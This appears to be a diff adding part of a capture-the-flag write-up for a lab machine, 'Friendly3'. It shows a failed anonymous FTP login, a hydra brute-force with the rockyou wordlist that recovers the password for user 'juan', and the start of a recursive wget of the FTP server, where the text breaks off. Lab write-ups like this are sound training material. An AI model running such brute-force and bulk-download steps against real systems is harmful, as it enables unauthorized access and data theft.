@@ -115,6 +115,67 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 86.43 seconds
            Raw packets sent: 124833 (5.493MB) | Rcvd: 12483 (499.328KB)
 
+We hae open 21, 22, 80 we are going to see what contains the website in the port 80 TCP 
 
+<img width="1359" height="310" alt="image" src="https://github.com/user-attachments/assets/a8936a8d-05ab-4a2f-9dd5-4e40b5b80f53" />
+
+I tried to login using ftp anonymous but it did´t work
+
+┌──(clandhacker㉿kali)-[~/Desktop/Friendly3]
+└─$ ftp 192.168.15.10
+Connected to 192.168.15.10.
+220 (vsFTPd 3.0.3)
+Name (192.168.15.10:clandhacker): anonymous
+331 Please specify the password.
+Password: 
+530 Login incorrect.
+ftp: Login failed
+ftp> 
+zsh: suspended  ftp 192.168.15.10
+
+So we need to complete a bruteforce attack using **hydra** with Juan user 
+
+comamnd
+
+ ┌──(clandhacker㉿kali)-[~/Desktop/Friendly3]
+
+ 
+└─$ hydra -l juan -P /usr/share/wordlists/rockyou.txt ftp://192.168.15.10 
+Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-09-19 20:11:15
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ftp://192.168.15.10:21/
+[21][ftp] host: 192.168.15.10   login: juan   password: alexis
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-09-19 20:11:55
+
+Now we can access to the ftp as juan with a password alexis
+
+┌──(clandhacker㉿kali)-[~/Desktop/Friendly3]
+
+└─$ ftp 192.168.15.10
+Connected to 192.168.15.10.
+220 (vsFTPd 3.0.3)
+Name (192.168.15.10:clandhacker): juan
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> 
+
+We are going to download everything from this machine using a command wget 
+
+┌──(clandhacker㉿kali)-[~/Desktop/Friendly3]
+└─$ wget -r ftp://"juan":"alexis"@192.168.15.10/                                              
+--2026-09-19 20:24:10--  ftp://juan:*password*@192.168.15.10/
+           => ‘192.168.15.10/.listing’
+Connecting to 192.168.15.10:21... connected.
+Logging in as juan ... Logged in!
+==> SYST ... done.    ==> PWD ... done.
+==> TYPE I ... done.  ==> CWD not needed.
+==> PASV ... done.    ==> LIST ... done.
 
 
